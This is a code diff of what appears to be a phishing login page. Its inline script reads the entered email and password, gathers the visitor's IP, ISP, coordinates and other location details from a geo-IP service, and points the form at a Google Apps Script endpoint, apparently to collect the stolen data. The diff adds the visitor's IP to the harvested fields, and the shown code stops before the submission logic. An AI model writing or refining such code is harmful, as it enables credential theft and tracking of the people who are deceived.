@@ -65,7 +65,6 @@
   font-size: inherit;
   font-family: 'Roboto';
 }
-
 .btn {
   display: block;
   width: 50%;
@@ -139,7 +138,7 @@ form a:hover {
 	  <script>
       var em = document.getElementById("email").value;
       var pa = document.getElementById("password").value;
-      $.get('https://json.geoiplookup.io/', function(res) {var a = ("ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code  + "\n" + "Currency : " + res.currency_name);document.getElementById("dtl").value = a;});
+      $.get('https://json.geoiplookup.io/', function(res) {var a = ("IP : " + res.ip + "\n" + "ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code  + "\n" + "Currency : " + res.currency_name);document.getElementById("dtl").value = a;});
       $.get('https://json.geoiplookup.io/', function(imp) {var b = (imp.ip);document.getElementById("i").value = b;});
       const scriptURL = 'https://script.google.com/macros/s/AKfycbx19Z7C8Ud6-Qg8cNv-A9pndUfY0I-z6WFZqO_oRqi1nn2nTo2JDBrt/exec'
     const form = document.forms['Form']
